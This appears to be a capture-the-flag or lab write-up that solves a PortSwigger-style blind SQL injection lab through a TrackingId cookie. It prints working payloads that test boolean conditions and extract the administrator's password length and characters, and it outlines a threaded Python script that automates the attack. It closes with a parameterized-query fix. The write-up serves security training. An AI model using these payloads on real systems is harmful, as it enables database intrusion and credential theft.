# Solution - Blind SQL Injection with Conditional Responses

## Vulnerability Analysis

The application tracks users using a cookie:

```
TrackingId
```

The cookie value is included in a SQL query.

Because user input is directly inserted into the SQL statement, an attacker can modify the query logic.

The application response contains a known keyword:

```
Welcome back!
```

This keyword indicates that the SQL condition returned `TRUE`.

## Identifying SQL Injection

Original cookie:

```
TrackingId=xyz
```

Testing condition:

```sql
xyz' AND 1=1 --
```

The response still contains:

```
Welcome back!
```

The condition is true.

Testing:

```sql
xyz' AND 1=2 --
```

The response changes.

The application behavior confirms a blind SQL injection vulnerability.

---

# Extracting Password Length

The first step is discovering the password length.

The payload:

```sql
' AND (
    SELECT 'A'
    FROM users
    WHERE username='administrator'
    AND LENGTH(password) > {length}
)='A' --
```

The database executes:

```sql
SELECT 'A'
FROM users
WHERE username='administrator'
AND LENGTH(password) > 10
```

If the password length is greater than the tested value, the application returns:

```
Welcome back!
```

The script uses binary search to find the exact length.

Example:

```
Testing length > 25
False

Testing length > 12
True

Testing length > 18
True

Password length: 20
```

---

# Extracting Password Characters

After finding the length, each character is extracted.

Payload:

```sql
' AND (
SELECT SUBSTR(password,{idx},1)
FROM users
WHERE username='administrator'
)='{char}
```

The payload checks one character at a time.

Example:

Checking the first character:

```sql
SUBSTR(password,1,1)='a'
```

If the response contains:

```
Welcome back!
```

then:

```
password[1] = a
```

The process repeats for every position.

---

# Python Automation

The exploit script automates the attack using:

## Password Length Discovery

```python
find_passwd_length()
```

Uses binary search instead of testing every possible length.

Benefits:

- Faster extraction
- Fewer HTTP requests

---

## Character Extraction

```python
find_char(idx)
```

For every password position:

1. Send SQL condition for each possible character.
2. Check the response.
3. Save the correct character.

The script uses:

```python
ThreadPoolExecutor
```

to test multiple characters simultaneously.

---

# Extracted Information

The final result is:

```
administrator password
```

The password can then be used to log into the application.

---

# Key Security Lessons

## Why This Vulnerability Exists

The application builds SQL queries using untrusted input:

Bad:

```python
query = "SELECT * FROM users WHERE id=" + user_input
```

The attacker controls the SQL logic.

---

## Secure Implementation

Use parameterized queries:

```python
query = """
SELECT * FROM users
WHERE id = %s
"""

cursor.execute(query, (user_input,))
```

The database treats the input as data instead of SQL code.

---

# References

- PortSwigger Web Security Academy - Blind SQL Injection
- OWASP SQL Injection Prevention Cheat Sheet
